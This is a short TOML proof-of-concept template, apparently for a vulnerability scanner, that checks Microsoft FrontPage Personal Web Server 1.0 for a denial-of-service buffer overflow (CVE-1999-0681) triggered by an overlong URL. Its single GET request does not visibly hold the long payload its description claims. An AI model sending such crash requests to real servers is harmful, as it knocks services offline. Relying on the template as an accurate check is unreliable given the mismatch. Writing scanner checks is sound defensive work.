[info]
author = "ave"
description = "Microsoft FrontPage Personal Web Server 1.0 缓冲区溢出拒绝服务漏洞验证。通过发送超长URL请求触发服务器扩展组件缓冲区溢出，导致Web服务崩溃。"
id = "POC-AVE-1999-0234"
name = "CVE-1999-0681 PoC"
severity = "medium"
tags = ["ave-1999-0234"]
vuln_id = [
    "CVE-1999-0681",
    "AVE-1999-0234",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["HTTP/1."]
